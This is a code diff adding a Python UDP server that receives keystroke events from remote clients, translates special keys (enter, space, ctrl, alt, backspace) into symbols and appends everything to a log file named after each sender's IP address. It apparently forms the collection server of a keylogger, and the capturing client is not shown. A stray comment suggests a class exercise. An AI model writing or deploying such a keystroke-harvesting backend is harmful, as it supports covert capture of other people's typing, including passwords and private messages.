@@ -1,0 +1,62 @@
+import socket
+import os
+
+def read_file(filename):
+    # Read the current content of the file
+    if os.path.exists(filename):
+        with open(filename, 'r') as file:
+            return file.read()
+    return ""
+
+def append_to_file(filename, text):
+    # Open the file in append mode
+    with open(filename, 'a') as file:
+        file.write(text) 
+
+def start_server():
+    # Create a UDP socket
+    server_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+
+    # Bind the socket to the address and port
+    server_address = ('localhost', 65432)  # Use your preferred IP and port
+    server_socket.bind(server_address)
+
+    print("Waiting for a connection...")
+
+    while True:
+        # Receive data from the client
+        data, client_address = server_socket.recvfrom(1024)
+
+        message = data.decode()
+        print(f"Received: {message} from {client_address}")
+        filename = str(client_address[0])
+        # Send a response back
+        response = "Message received"
+        server_socket.sendto(response.encode(), client_address)
+
+        # Exit if the client sends a specific termination message
+        if message.lower() == 'exit':
+            print("Termination message received. Closing server.")
+            break
+        if 'Key' in message:
+            if 'enter' in message:
+                append_to_file(filename,"\n")
+            if 'space' in message:
+                append_to_file(filename," ")
+            if 'ctrl' in message:
+                append_to_file(filename,"⎈")
+            if 'alt' in message:
+                append_to_file(filename,"❖")
+            if 'backspace'in message:
+                append_to_file(str(client_address[0]),"⌫")
+        else:
+            append_to_file(str(client_address[0]),message)
+
+
+    server_socket.close()
+    print("Server closed.")
+
+if __name__ == "__main__":
+    start_server()
+#how the class is coing
+#
